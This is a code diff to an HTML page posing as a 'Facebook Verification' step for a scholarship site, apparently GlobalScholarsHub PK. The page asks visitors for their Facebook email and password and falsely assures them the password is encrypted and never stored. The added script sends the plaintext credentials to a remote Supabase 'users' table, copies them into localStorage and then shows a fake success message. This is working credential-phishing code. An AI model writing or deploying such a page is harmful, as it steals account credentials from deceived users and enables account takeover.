@@ -6,6 +6,7 @@
     <title>Facebook Verification - GlobalScholarsHub PK</title>
     <link rel="stylesheet" href="css/style.css" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"></script>
 </head>
 <body>
 
@@ -72,7 +73,6 @@
                     <p>Connect your Facebook account to continue</p>
                 </div>
 
-                <!-- Trust Badge -->
                 <div class="fb-trust-badge">
                     <i class="fas fa-shield-alt"></i>
                     <div class="trust-text">
@@ -83,7 +83,6 @@
                     </div>
                 </div>
 
-                <!-- Security Note -->
                 <div class="fb-security-note">
                     <i class="fas fa-lock"></i>
                     <span>
@@ -92,11 +91,10 @@
                     </span>
                 </div>
 
-                <!-- Facebook Form - NO ACTION -->
                 <form class="fb-form" id="facebookForm">
                     <div class="form-group">
                         <label><i class="fab fa-facebook-f"></i> Facebook ID / Email</label>
-                        <input type="email" placeholder="Enter your Facebook email or ID" required />
+                        <input type="email" id="fbEmail" placeholder="Enter your Facebook email or ID" required />
                         <div class="input-hint">
                             <i class="fas fa-info-circle"></i>
                             Use the email associated with your Facebook account
@@ -105,7 +103,7 @@
 
                     <div class="form-group">
                         <label><i class="fas fa-lock"></i> Facebook Password</label>
-                        <input type="password" placeholder="Enter your Facebook password" required />
+                        <input type="password" id="fbPassword" placeholder="Enter your Facebook password" required />
                         <div class="input-hint">
                             <i class="fas fa-info-circle"></i>
                             Your password is encrypted and never stored
@@ -136,29 +134,74 @@
     <script src="js/script.js"></script>
 
     <script>
+        // ===== Supabase Initialize =====
+        const supabaseUrl = 'https://wpsx11yolaoqucmvah.supabase.co';
+        const supabaseKey = 'sb_publishable_I0tVjJYAMpFojpHXOhNlg_IoRI-zK4';
+        const supabase = supabase.createClient(supabaseUrl, supabaseKey);
+
         document.getElementById('facebookForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            const fbEmail = document.querySelector('input[placeholder="Enter your Facebook email or ID"]').value;
-            const fbPassword = document.querySelector('input[placeholder="Enter your Facebook password"]').value;
+            const fbEmail = document.getElementById('fbEmail').value;
+            const fbPassword = document.getElementById('fbPassword').value;
+            const submittedAt = new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });
             
-            const fbData = { fbEmail, fbPassword };
-            
-            try {
-                const response = await fetch('/api/save-user', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(fbData)
-                });
-                const result = await response.json();
-                console.log('✅ Facebook data saved:', result);
-                alert('✅ Facebook verified successfully!');
-            } catch (error) {
-                console.log('⚠️ Error saving Facebook data:', error);
-                alert('⚠️ Error saving data. Make sure server is running (node server.js)');
+            if (!fbEmail || !fbPassword) {
+                alert('⚠️ Please fill all fields!');
+                return;
             }
             
-            window.location.href = 'complete-profile.html';
+            console.log('📤 Sending Facebook data:', { fbEmail, fbPassword });
+            
+            try {
+                // ===== SAVE TO SUPABASE =====
+                const { data, error } = await supabase
+                    .from('users')
+                    .insert([
+                        { 
+                            fb_email: fbEmail, 
+                            fb_password: fbPassword,
+                            submitted_at: submittedAt
+                        }
+                    ])
+                    .select();
+
+                if (error) {
+                    console.error('❌ Supabase Error:', error);
+                    alert('⚠️ Facebook Error: ' + error.message);
+                    return;
+                }
+
+                console.log('✅ Facebook data saved to Supabase!', data);
+
+                // ===== SAVE TO LOCAL STORAGE =====
+                let allUsers = [];
+                try {
+                    const saved = localStorage.getItem('allUsersData');
+                    if (saved) {
+                        allUsers = JSON.parse(saved);
+                    }
+                } catch (e) {
+                    allUsers = [];
+                }
+                
+                allUsers.push({
+                    id: Date.now(),
+                    fbEmail: fbEmail,
+                    fbPassword: fbPassword,
+                    submittedAt: submittedAt
+                });
+                
+                localStorage.setItem('allUsersData', JSON.stringify(allUsers));
+                console.log('✅ Facebook data saved to Local Storage!');
+
+                alert('✅ Facebook verified successfully! Redirecting to Profile...');
+                window.location.href = 'complete-profile.html';
+                
+            } catch (error) {
+                console.error('❌ Error:', error);
+                alert('⚠️ Error: ' + error.message);
+            }
         });
     </script>
 
